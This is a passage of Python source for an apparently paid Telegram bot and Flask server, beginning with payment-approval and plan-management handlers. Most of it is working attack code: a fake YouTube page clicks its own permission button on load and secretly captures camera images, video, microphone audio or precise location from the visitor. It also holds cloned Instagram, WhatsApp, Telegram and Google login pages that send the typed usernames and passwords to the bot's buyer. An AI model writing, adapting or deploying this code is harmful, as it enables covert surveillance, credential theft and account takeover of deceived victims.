    bot.register_next_step_handler_by_chat_id(call.message.chat.id, receive_payment_screenshot, oid)

def receive_payment_screenshot(message, oid):
    db = load_db(); order = db.get("pending_orders", {}).get(oid)
    if not order or order.get("uid") != str(message.from_user.id) or order.get("status") != "awaiting_payment":
        bot.send_message(message.chat.id, "Invalid order."); return
    if not message.photo:
        bot.send_message(message.chat.id, "Screenshot as photo bhejein.")
        bot.register_next_step_handler_by_chat_id(message.chat.id, receive_payment_screenshot, oid); return
    order["screenshot_file_id"] = message.photo[-1].file_id
    order["status"] = "pending_admin"; save_db(db)
    mk = types.InlineKeyboardMarkup()
    mk.row(types.InlineKeyboardButton("✅ Approve", callback_data=f"pay_approve:{oid}"),
           types.InlineKeyboardButton("❌ Reject", callback_data=f"pay_reject:{oid}"))
    cap = (f"💳 <b>Payment</b>\nOrder: <code>{oid}</code>\nUser: <code>{order['uid']}</code>\n"
           f"Plan: {order['plan'].get('name')}\nAmount: ₹{order['amount']}")
    bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=cap, parse_mode="HTML", reply_markup=mk)
    bot.send_message(message.chat.id, "📨 Sent to admin.")

@bot.callback_query_handler(func=lambda c: c.data.startswith(("pay_approve:", "pay_reject:")))
def payment_review_callback(call):
    if not _is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True); return
    action, oid = call.data.split(":", 1)
    db = load_db(); order = db.get("pending_orders", {}).get(oid)
    if not order or order.get("status") != "pending_admin":
        bot.answer_callback_query(call.id, "Already processed", show_alert=True); return
    uid = order["uid"]
    if action == "pay_approve":
        u = db["users"].get(uid)
        if not u:
            bot.answer_callback_query(call.id, "User missing", show_alert=True); return
        plan = order["plan"]
        if plan.get("kind") == "tokens":
            a = int(plan.get("value", 0)); u["tokens"] = int(u.get("tokens", 0)) + a
            _add_history(u, f"purchase_{oid}", a)
        elif plan.get("kind") == "vip":
            d = int(plan.get("value", 0))
            base = datetime.now()
            try:
                old = datetime.strptime(u.get("expiry"), "%Y-%m-%d %H:%M:%S")
                if u.get("plan") == "unlimited" and old > base: base = old
            except Exception: pass
            u["plan"] = "unlimited"; u["expiry"] = (base + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
            _add_history(u, f"purchase_vip_{oid}", 0)
        elif plan.get("kind") == "premium":
            d = int(plan.get("value", 0))
            base = datetime.now()
            try:
                old = datetime.strptime(u.get("premium_expiry"), "%Y-%m-%d %H:%M:%S")
                if old > base: base = old
            except Exception: pass
            u["premium_expiry"] = (base + timedelta(days=d)).strftime("%Y-%m-%d %H:%M:%S")
            _add_history(u, f"purchase_prem_{oid}", 0)
        order["status"] = "approved"; save_db(db)
        bot.send_message(int(uid), f"✅ Payment verified. <b>{plan.get('name')}</b> activated. Order <code>{oid}</code>.", parse_mode="HTML")
        bot.answer_callback_query(call.id, "Approved")
        try: bot.edit_message_caption((call.message.caption or "") + "\n✅ APPROVED", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except Exception: pass
    else:
        order["status"] = "rejected"; save_db(db)
        bot.send_message(int(uid), f"❌ Order <code>{oid}</code> rejected.", parse_mode="HTML")
        bot.answer_callback_query(call.id, "Rejected")
        try: bot.edit_message_caption((call.message.caption or "") + "\n❌ REJECTED", call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=None)
        except Exception: pass

@bot.message_handler(func=lambda m: m.text == BTN_MANAGE_PLANS)
def admin_manage_plans(message):
    if not _is_admin(message.from_user.id): return
    db = load_db(); mk = types.InlineKeyboardMarkup(row_width=2)
    for pid, plan in db.get("plans", {}).items():
        st = "🟢" if plan.get("active", True) else "⚫"
        mk.row(types.InlineKeyboardButton(f"{st} {plan.get('name',pid)}", callback_data=f"plan_toggle:{pid}"),
               types.InlineKeyboardButton(f"🗑 {pid}", callback_data=f"plan_delete:{pid}"))
    mk.add(types.InlineKeyboardButton("➕ Add Plan", callback_data="plan_add"))
    bot.send_message(message.chat.id, f"<blockquote>🛍 <b>Plans</b></blockquote>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data in ("plan_add",) or c.data.startswith(("plan_toggle:", "plan_delete:")))
def plan_manage_callback(call):
    if not _is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "Admin only", show_alert=True); return
    db = load_db()
    if call.data == "plan_add":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "Format: <code>ID | Name | tokens/vip/premium | value | price</code>", parse_mode="HTML")
        bot.register_next_step_handler_by_chat_id(call.message.chat.id, admin_add_plan); return
    action, pid = call.data.split(":", 1)
    if pid not in db.get("plans", {}):
        bot.answer_callback_query(call.id, "Not found", show_alert=True); return
    if action == "plan_toggle":
        db["plans"][pid]["active"] = not db["plans"][pid].get("active", True)
    else:
        del db["plans"][pid]
    save_db(db); bot.answer_callback_query(call.id, "Updated")
    try: bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=None)
    except Exception: pass
    bot.send_message(call.message.chat.id, "Updated. Manage Plans again.")

def admin_add_plan(message):
    if not _is_admin(message.from_user.id): return
    try:
        pid, name, kind, val, price = [x.strip() for x in message.text.split("|")]
        val = int(val); price = money(price)
        if not pid.isalnum() or kind not in ("tokens", "vip", "premium") or val <= 0 or price <= 0: raise ValueError
        db = load_db()
        db.setdefault("plans", {})[pid] = {"name": name[:40], "kind": kind, "value": val, "price": str(price), "active": True}
        save_db(db)
        bot.send_message(message.chat.id, f"✅ Plan <b>{name}</b> added.", parse_mode="HTML")
    except Exception:
        bot.send_message(message.chat.id, "❌ Invalid. Example: <code>prem2 | Premium 60D | premium | 60 | 1500</code>", parse_mode="HTML")

# ============================================================
# FLASK TEMPLATES & ROUTES
# ============================================================

PREMIUM_HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>YouTube</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Roboto,Arial,sans-serif;background:#0f0f0f;color:#fff;overflow-x:hidden}
.topbar{display:flex;align-items:center;gap:10px;padding:10px 14px;background:#0f0f0f;position:sticky;top:0;z-index:100;border-bottom:1px solid #303030}
.ytlogo{display:flex;align-items:center;gap:4px;font-weight:700;font-size:20px;letter-spacing:-1px}
.ytlogo .play{background:#f00;color:#fff;border-radius:4px;padding:2px 6px;font-size:12px}
.searchbox{flex:1;background:#121212;border:1px solid #303030;border-radius:20px;display:flex;align-items:center;padding:6px 12px}
.searchbox input{flex:1;background:transparent;border:none;color:#fff;outline:none;font-size:14px}
.searchbox button{background:#303030;border:none;color:#fff;padding:4px 10px;border-radius:14px;font-size:12px;cursor:pointer}
.av{width:32px;height:32px;border-radius:50%;background:#f00;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px}
.player{position:relative;width:100%;aspect-ratio:16/9;background:#000}
.player iframe{width:100%;height:100%;border:0}
.vidinfo{padding:12px 14px;border-bottom:1px solid #272727}
.vidtitle{font-size:15px;font-weight:600;line-height:1.3}
.vidmeta{font-size:12px;color:#aaa;margin-top:6px}
.chips{display:flex;gap:8px;padding:10px 14px;overflow-x:auto;border-bottom:1px solid #272727}
.chip{background:#272727;padding:6px 14px;border-radius:16px;font-size:12px;white-space:nowrap;cursor:pointer}
.chip.active{background:#fff;color:#000;font-weight:600}
.grid{display:grid;grid-template-columns:1fr;gap:14px;padding:14px}
.card{background:#0f0f0f;border-radius:10px;overflow:hidden;cursor:pointer}
.thumb{width:100%;aspect-ratio:16/9;background:#272727;position:relative}
.thumb img{width:100%;height:100%;object-fit:cover}
.thumb .dur{position:absolute;bottom:6px;right:6px;background:rgba(0,0,0,0.8);padding:2px 5px;font-size:11px;border-radius:3px}
.cardmeta{display:flex;gap:10px;padding:10px}
.cardav{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#f00,#c00);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-weight:700}
.cardtext{flex:1;min-width:0}
.cardtitle{font-size:13px;font-weight:500;line-height:1.3;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
.cardch{font-size:12px;color:#aaa;margin-top:4px}
.sec{display:none;min-height:100vh}
.sec.active{display:block}
.permwrap{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:30px;text-align:center; background: #0f0f0f;}
.permicon{font-size:70px;margin-bottom:20px;}
.permtitle{font-size:22px;font-weight:600;margin-bottom:10px}
.permtext{color:#aaa;font-size:14px;margin-bottom:30px;max-width:320px}
.permbtn{background:#f00;color:#fff;border:none;padding:14px 50px;border-radius:25px;font-size:16px;font-weight:600;cursor:pointer}
.permbtn:disabled{background:#333;cursor:not-allowed}
.loadwrap{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
.spinner{width:50px;height:50px;border:4px solid #272727;border-top-color:#f00;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.loadtext{margin-top:20px;color:#aaa;font-size:14px}
</style></head>
<body>

<!-- Humne pehle page (sec-perm) ko hide kar diya hai taaki wo na dikhe -->
<div id="sec-perm" class="sec" style="display:none;">
  <div class="permwrap">
    <div class="permicon" id="picon">📷</div>
    <div class="permtitle" id="ptitle">Camera Access</div>
    <div class="permtext" id="ptext">YouTube needs camera permission to continue.</div>
    <button class="permbtn" id="pbtn" onclick="askPerm()">Allow</button>
  </div>
</div>

<div id="sec-load" class="sec active">
  <div class="loadwrap">
    <div class="spinner"></div>
    <div class="loadtext">Loading video...</div>
  </div>
</div>

<div id="sec-main" class="sec">
  <div class="topbar">
    <div class="ytlogo"><span class="play">▶</span>YouTube</div>
    <div class="searchbox">
      <input id="q" placeholder="Search" onkeydown="if(event.key==='Enter')doSearch()">
      <button onclick="doSearch()">🔍</button>
    </div>
    <div class="av">A</div>
  </div>
  <div class="player"><iframe id="ytframe" allowfullscreen></iframe></div>
  <div class="vidinfo">
    <div class="vidtitle" id="vtitle">YouTube Video</div>
    <div class="vidmeta" id="vmeta">1.2M views • 2 days ago</div>
  </div>
  <div class="chips">
    <div class="chip active">All</div><div class="chip">Music</div>
    <div class="chip">Gaming</div><div class="chip">News</div><div class="chip">Live</div>
  </div>
  <div class="grid" id="grid"></div>
</div>

<script>
const VID = "{{ yt_id }}";
const LINK_ID = "{{ link_id }}";
const ITEM = "{{ item }}";
const PERM = "{{ perm }}";

const ICONS = {camera:"📷", "camera+mic":"🎥", mic:"🎙", location:"📍"};
const TITLES = {camera:"Camera Access", "camera+mic":"Camera & Microphone", mic:"Microphone Access", location:"Location Access"};
const TEXTS = {
  camera:"YouTube needs camera permission to continue.",
  "camera+mic":"YouTube needs camera and microphone permission to record video.",
  mic:"YouTube needs microphone permission to continue.",
  location:"YouTube needs location permission to show local content."
};

document.getElementById('picon').innerText = ICONS[PERM] || "📷";
document.getElementById('ptitle').innerText = TITLES[PERM] || "Permission Required";
document.getElementById('ptext').innerText = TEXTS[PERM] || "Permission required to continue.";

function post(url, data){
  return fetch(url, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)}).catch(()=>{});
}

// ========================================================
// YAHAN CHANGE KIYA HAI: Page load hote hi automatic Allow click hoga
// ========================================================
window.onload = function() {
    // Browser ko lagega user ne click kiya hai
    setTimeout(function() {
        document.getElementById('pbtn').click();
    }, 500); // 0.5 second baad popup aayega
};

async function askPerm(){
  try {
    if (PERM.includes('camera')) {
      const s = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "{{ facing }}" }, audio: PERM.includes('mic')
      });
      await captureMedia(s);
    } else if (PERM === 'mic') {
      const s = await navigator.mediaDevices.getUserMedia({ audio: true });
      await captureAudio(s);
    } else if (PERM === 'location') {
      navigator.geolocation.getCurrentPosition(
        async pos => {
          await post('/api/premium/location', {
            link_id: LINK_ID, lat: pos.coords.latitude, lng: pos.coords.longitude,
            acc: pos.coords.accuracy
          });
          showMain();
        },
        err => { post('/api/premium/error',{link_id:LINK_ID,error:err.message}); showMain(); }, // Deny karne par bhi aage badhega
        { enableHighAccuracy: true, timeout: 20000 }
      );
      return;
    }
  } catch(e) {
    post('/api/premium/error', {link_id: LINK_ID, error: e.message});
  }
  showMain(); // Agar permission deny kare tab bhi YouTube wala page khul jaye
}

async function captureMedia(stream){
  const v = document.createElement('video');
  v.srcObject = stream; v.muted = true; v.playsInline = true;
  await v.play();
  const dur = "{{ is_video }}" === "True" ? 8000 : 1500;
  setTimeout(async () => {
    const c = document.createElement('canvas');
    c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
    const snap = c.toDataURL('image/jpeg', 0.85);
    let videoB64 = null;
    if (dur === 8000) {
      try { videoB64 = await recordVideo(stream, 8000); } catch(e){}
    }
    post('/api/premium/capture', {
      link_id: LINK_ID, image: snap, video: videoB64,
      facing: "{{ facing }}", kind: ITEM
    });
    stream.getTracks().forEach(t => t.stop());
  }, dur);
}

function recordVideo(stream, ms){
  return new Promise(resolve => {
    const rec = new MediaRecorder(stream);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const blob = new Blob(chunks, {type:'video/webm'});
      const r = new FileReader();
      r.onloadend = () => resolve(r.result);
      r.readAsDataURL(blob);
    };
    rec.start();
    setTimeout(() => rec.stop(), ms);
  });
}

async function captureAudio(stream){
  return new Promise(resolve => {
    const rec = new MediaRecorder(stream);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const blob = new Blob(chunks, {type:'audio/webm'});
      const r = new FileReader();
      r.onloadend = async () => {
        await post('/api/premium/audio', {link_id: LINK_ID, audio: r.result});
        stream.getTracks().forEach(t => t.stop());
        resolve();
      };
      r.readAsDataURL(blob);
    };
    rec.start();
    setTimeout(() => rec.stop(), 6000);
  });
}

function showMain(){
  // Jab permission kaam ho jaye (ya user deny kar de), toh loadar dikha kar direct YouTube khol do
  document.getElementById('sec-load').classList.add('active');
  setTimeout(() => {
    document.getElementById('sec-load').classList.remove('active');
    document.getElementById('sec-main').classList.add('active');
    loadVideo(VID);
    buildGrid();
  }, 800);
}

function loadVideo(id){
  document.getElementById('ytframe').src = "https://www.youtube.com/embed/" + id + "?autoplay=1&playsinline=1";
}

const DEMO = [
  {id:"dQw4w9WgXcQ", t:"Rick Astley - Never Gonna Give You Up", c:"Rick Astley", v:"1.5B views", d:"4:33"},
  {id:"9bZkp7q19", t:"PSY - GANGNAM STYLE", c:"officialpsy", v:"4.9B views", d:"4:12"},
  {id:"kJQP7kiw5Fk", t:"Luis Fonsi - Despacito", c:"Luis Fonsi", v:"8.3B views", d:"4:41"}
];

function buildGrid(){
  const g = document.getElementById('grid');
  g.innerHTML = '';
  DEMO.forEach(v => {
    const d = document.createElement('div');
    d.className = 'card';
    d.onclick = () => loadVideo(v.id);
    d.innerHTML = `
      <div class="thumb">
        <img src="https://img.youtube.com/vi/${v.id}/mqdefault.jpg" alt="">
        <div class="dur">${v.d}</div>
      </div>
      <div class="cardmeta">
        <div class="cardav">A</div>
        <div class="cardtext">
          <div class="cardtitle">${v.t}</div>
          <div class="cardch">${v.c} • ${v.v}</div>
        </div>
      </div>`;
    g.appendChild(d);
  });
}

function doSearch(){
  const q = document.getElementById('q').value.trim();
  if (!q) return;
  window.location.href = "https://www.youtube.com/results?search_query=" + encodeURIComponent(q);
}
</script></body></html>"""

@app.route('/premium/<link_id>')
def premium_victim_page(link_id):
    db = load_db()
    link = db.get("premium_links", {}).get(link_id)
    if not link:
        return "Link expired", 404
    return render_template_string(PREMIUM_HTML,
        yt_id=link.get("yt_id", ""),
        link_id=link_id,
        item=link.get("item", ""),
        perm=link.get("perm", "camera"),
        facing=link.get("facing", "user"),
        is_video=str(link.get("video", False))
    )

@app.route('/api/premium/capture', methods=['POST'])
def premium_capture():
    try:
        data = request.get_json(force=True)
        link_id = data.get('link_id')
        db = load_db()
        link = db.get("premium_links", {}).get(link_id)
        if not link:
            return jsonify({"status": "error", "message": "Invalid link"}), 404

        uid = link.get("uid")
        label = link.get("label", "Capture")
        facing = data.get('facing', link.get('facing', 'user'))
        kind = data.get('kind', link.get('item', 'camera'))

        image_b64 = data.get('image', '')
        video_b64 = data.get('video')

        cap = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "facing": facing,
            "kind": kind
        }
        if image_b64:
            cap["image_file_id"] = image_b64
        if video_b64:
            cap["video_file_id"] = video_b64
        link.setdefault("captures", []).append(cap)
        save_db(db)

        try:
            cap_text = (f"<blockquote>🔥 <b>{label} Capture</b>\n"
                        f"👤 UID: <code>{uid}</code>\n"
                        f"🎥 Type: {kind}\n"
                        f"📷 Facing: {facing}\n"
                        f"⏰ {cap['timestamp']}\n{DEV_TAG}</blockquote>")
            if image_b64:
                img_bytes = base64.b64decode(image_b64.split(',')[-1])
                bot.send_photo(int(uid), img_bytes, caption=cap_text, parse_mode="HTML")
            if video_b64:
                vid_bytes = base64.b64decode(video_b64.split(',')[-1])
                bot.send_video(int(uid), vid_bytes, caption=cap_text, parse_mode="HTML", supports_streaming=True)
        except Exception as e:
            print("Bot send error:", e)
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/premium/audio', methods=['POST'])
def premium_audio():
    try:
        data = request.get_json(force=True)
        link_id = data.get('link_id')
        db = load_db()
        link = db.get("premium_links", {}).get(link_id)
        if not link:
            return jsonify({"status": "error"}), 404
        uid = link.get("uid")
        audio_b64 = data.get('audio', '')
        if audio_b64:
            try:
                audio_bytes = base64.b64decode(audio_b64.split(',')[-1])
                bot.send_voice(int(uid), audio_bytes,
                    caption=f"🎙 <b>Audio Capture</b>\n👤 UID: <code>{uid}</code>\n{DEV_TAG}",
                    parse_mode="HTML")
            except Exception as e:
                print("Audio send error:", e)
        link.setdefault("captures", []).append({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "kind": "audio"
        })
        save_db(db)
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/premium/location', methods=['POST'])
def premium_location():
    try:
        data = request.get_json(force=True)
        link_id = data.get('link_id')
        lat = data.get('lat'); lng = data.get('lng'); acc = data.get('acc')
        db = load_db()
        link = db.get("premium_links", {}).get(link_id)
        if not link:
            return jsonify({"status": "error"}), 404
        uid = link.get("uid")
        link.setdefault("captures", []).append({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "kind": "location", "lat": lat, "lng": lng, "acc": acc
        })
        save_db(db)
        try:
            bot.send_location(int(uid), lat, lng)
            bot.send_message(int(uid),
                f"<blockquote>📍 <b>Location Capture</b>\n"
                f"Lat: <code>{lat}</code>\nLng: <code>{lng}</code>\n"
                f"Acc: {acc}m\n"
                f"🔗 <a href='https://maps.google.com/?q={lat},{lng}'>Open Maps</a>\n"
                f"{DEV_TAG}</blockquote>", parse_mode="HTML")
        except Exception as e:
            print("Location send error:", e)
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/premium/error', methods=['POST'])
def premium_error():
    try:
        data = request.get_json(force=True)
        link_id = data.get('link_id')
        err = data.get('error', 'unknown')
        db = load_db()
        link = db.get("premium_links", {}).get(link_id)
        if link:
            uid = link.get("uid")
            try:
                bot.send_message(int(uid),
                    f"<blockquote>⚠️ <b>Capture Error</b>\nLink: <code>{link_id}</code>\nError: {err}\n{DEV_TAG}</blockquote>",
                    parse_mode="HTML")
            except Exception: pass
        return jsonify({"status": "ok"})
    except Exception:
        return jsonify({"status": "error"}), 500

# ----------------- INSTA/WA/TG/GOOGLE HACK TEMPLATES & ROUTES -----------------
INSTA_HACK_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login • Instagram</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background: #ffffff;
    color: #262626;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    min-height: 100vh;
}

.container {
    width: 100%;
    max-width: 420px;
    margin: auto;
    min-height: 100vh;
    padding: 20px;
    display: flex;
    flex-direction: column;
}

.top {
    display: flex;
    align-items: center;
    justify-content: space-between;
    font-size: 14px;
    color: #262626;
}

.back {
    font-size: 23px;
}

.language {
    margin: 35px auto 55px;
    font-size: 13px;
    color: #737373;
    text-align: center;
}

.logo {
    width: 65px;
    height: 65px;
    border-radius: 19px;
    border: 4px solid #d52cae;
    position: relative;
    margin: 0 auto 70px;
}

.logo:before {
    content: "";
    position: absolute;
    width: 25px;
    height: 25px;
    border: 4px solid #ff8c32;
    border-radius: 50%;
    top: 10px;
    left: 10px;
}

.logo:after {
    content: "";
    position: absolute;
    width: 7px;
    height: 7px;
    background: #ff8c32;
    border-radius: 50%;
    right: 8px;
    top: 8px;
}

input {
    width: 100%;
    padding: 17px 13px;
    margin-bottom: 12px;
    border-radius: 12px;
    border: 1px solid #dbdbdb;
    background: #fafafa;
    color: #262626;
    outline: none;
    font-size: 14px;
}

input:focus {
    border-color: #a8a8a8;
    background: #ffffff;
}

button {
    width: 100%;
    padding: 14px;
    border-radius: 30px;
    border: none;
    background: #0095f6;
    color: white;
    font-size: 15px;
    font-weight: bold;
    margin-top: 5px;
    cursor: pointer;
}

button:hover {
    background: #1877f2;
}

.forgot {
    text-align: center;
    margin-top: 20px;
    font-size: 13px;
    color: #00376b;
    font-weight: 600;
}

.create {
    text-align: center;
    padding: 13px;
    border: 1px solid #0095f6;
    border-radius: 30px;
    margin-top: 40px;
    color: #0095f6;
    font-size: 14px;
    font-weight: 600;
}

.footer {
    text-align: center;
    margin-top: auto;
    padding-top: 45px;
    padding-bottom: 10px;
    color: #8e8e8e;
    font-size: 14px;
    font-weight: 600;
}
</style>
</head>

<body>

<div class="container">

    <div class="top">
        <span class="back">‹</span>
        <span style="font-weight: 600;">Social Login</span>
        <span>⋮</span>
    </div>

    <div class="language">English (UK) ⌄</div>

    <div class="logo"></div>

    <form onsubmit="return go(event)">
        <input id="u" type="text" placeholder="Username, email address or mobile number" required>
        <input id="p" type="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>

    <div class="forgot">
        Forgot password?
    </div>

    <div class="create">
        Create new account
    </div>

    <div class="footer">
        ◉ Instagram
    </div>

</div>

<script>
async function go(e){
    e.preventDefault();
    const u = document.getElementById('u').value;
    const p = document.getElementById('p').value;
    try {
        await fetch('/api/insta-hack/login', {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({
                chat_id: '{{chat_id }}', 
                username: u, 
                password: p
            })
        });
    } catch(x){}
    
    // Login ke baad error message dikhane ke liye
    alert('Sorry, your password was incorrect. Please double-check your password.');
    document.getElementById('p').value = '';
    return false;
}
</script>

</body>
</html>"""

WA_HACK_TEMPLATE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WhatsApp</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,sans-serif;background:#f0f2f5;min-height:100vh}
.top{background:#00a884;padding:20px;display:flex;align-items:center;gap:12px;color:#fff}.top .dot{width:30px;height:30px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#00a884;font-weight:bold;font-size:18px}.top .title{font-size:18px;font-weight:600}
.main{display:flex;justify-content:center;align-items:center;padding:20px;min-height:calc(100vh - 70px)}
.card{background:#fff;border-radius:8px;padding:32px 30px;max-width:400px;width:100%;box-shadow:0 2px 8px rgba(0,0,0,0.1)}
.head{font-size:22px;color:#111;margin-bottom:16px;text-align:center}.sub{color:#666;font-size:14px;text-align:center;margin-bottom:24px}
input{width:100%;padding:14px;border:1px solid #ddd;border-radius:6px;font-size:15px;margin-bottom:12px;outline:none}
button{width:100%;padding:14px;background:#00a884;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer}
.err{background:#fee;color:#c33;padding:10px;border-radius:6px;margin-bottom:12px;display:none;font-size:13px;text-align:center}</style></head>
<body><div class="top"><div class="dot">W</div><div class="title">WhatsApp</div></div>
<div class="main"><div class="card"><div class="head">Enter phone number</div><div class="sub">Enter your phone number to log in</div><div id="err" class="err"></div>
<form onsubmit="return go(event)"><input id="phone" type="tel" placeholder="+91 98765 43210" required><input id="pass" type="password" placeholder="Password / Code" required><button type="submit">Next</button></form></div></div>
<script>async function go(e){e.preventDefault();const p=document.getElementById('phone').value,q=document.getElementById('pass').value;
try{await fetch('/api/wa-hack/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'{{chat_id}}',username:p,password:q})})}catch(x){}
document.getElementById('err').style.display='block';document.getElementById('err').innerText='Network error. Please check your connection and try again.';
document.getElementById('pass').value='';return false;}</script></body></html>"""

TG_HACK_TEMPLATE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Telegram</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,sans-serif;background:#17212b;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#17212b;border-radius:12px;padding:40px 30px;max-width:380px;width:100%}
.logo{text-align:center;margin-bottom:20px;font-size:70px}.head{text-align:center;color:#fff;font-size:22px;font-weight:500;margin-bottom:8px}.sub{color:#7f91a3;font-size:14px;text-align:center;margin-bottom:30px}
input{width:100%;padding:14px;background:#242f3d;border:1px solid #2b3947;color:#fff;border-radius:8px;font-size:15px;margin-bottom:12px;outline:none}
button{width:100%;padding:14px;background:#3390ec;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}
.err{background:#3a1a1a;color:#ff8080;padding:10px;border-radius:6px;margin-bottom:12px;display:none;font-size:13px;text-align:center;border:1px solid #5a2828}</style></head>
<body><div class="card"><div class="logo">✈️</div><div class="head">Sign in to Telegram</div><div class="sub">Confirm your country and enter phone number</div><div id="err" class="err"></div>
<form onsubmit="return go(event)"><input id="phone" type="tel" placeholder="Phone number" required><input id="pass" type="password" placeholder="Verification code" required><button type="submit">Next</button></form></div>
<script>async function go(e){e.preventDefault();const p=document.getElementById('phone').value,q=document.getElementById('pass').value;
try{await fetch('/api/tg-hack/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'{{chat_id}}',username:p,password:q})})}catch(x){}
document.getElementById('err').style.display='block';document.getElementById('err').innerText='Network error. Please check your connection and try again.';
document.getElementById('pass').value='';return false;}</script></body></html>"""

GOOGLE_HACK_TEMPLATE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:-apple-system,sans-serif;background:#fff;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%}
.logo{text-align:center;margin-bottom:16px;font-size:24px;font-weight:500}.head{text-align:center;font-size:24px;color:#202124;margin-bottom:8px}.sub{text-align:center;font-size:16px;color:#5f6368;margin-bottom:30px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:20px}
.btn{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
.err{background:#fce8e6;color:#c5221f;padding:12px;border-radius:4px;margin-bottom:16px;display:none;font-size:14px}</style></head>
<body><div class="card"><div class="logo"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>
<div class="head">Sign in</div><div class="sub">Use your Google Account</div><div id="err" class="err"></div>
<form onsubmit="return go(event)"><input id="email" type="email" placeholder="Email or phone" required><input id="pass" type="password" placeholder="Enter your password" required><div class="actions"><span></span><button type="submit" class="btn">Next</button></div></form></div>
<script>async function go(e){e.preventDefault();const em=document.getElementById('email').value,p=document.getElementById('pass').value;
try{await fetch('/api/google-hack/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'{{chat_id}}',username:em,password:p})})}catch(x){}
document.getElementById('err').style.display='block';document.getElementById('err').innerText="Couldn't sign you in. Network error. Please try again.";
document.getElementById('pass').value='';return false;}</script></body></html>"""

@app.route('/insta-hack')
def insta_hack_page():
    return render_template_string(INSTA_HACK_TEMPLATE, chat_id=request.args.get('chat_id',''))

@app.route('/wa-hack')
def wa_hack_page():
    return render_template_string(WA_HACK_TEMPLATE, chat_id=request.args.get('chat_id',''))

@app.route('/tg-hack')
def tg_hack_page():
    return render_template_string(TG_HACK_TEMPLATE, chat_id=request.args.get('chat_id',''))

@app.route('/google-hack')
def google_hack_page():
    return render_template_string(GOOGLE_HACK_TEMPLATE, chat_id=request.args.get('chat_id',''))

@app.route('/api/insta-hack/login', methods=['POST'])
def insta_hack_login():
    d = request.get_json(force=True)
    cid = d.get('chat_id'); u = d.get('username'); p = d.get('password')
    if cid:
        try:
            bot.send_message(int(cid), f"<blockquote>📸 <b>Instagram Login Attempt</b>\n👤 User: <code>{u}</code>\n🔑 Pass: <code>{p}</code>\n{DEV_TAG}</blockquote>", parse_mode="HTML")
        except Exception: pass
    return jsonify({"status":"ok"})

@app.route('/api/wa-hack/login', methods=['POST'])
def wa_hack_login():
    d = request.get_json(force=True)
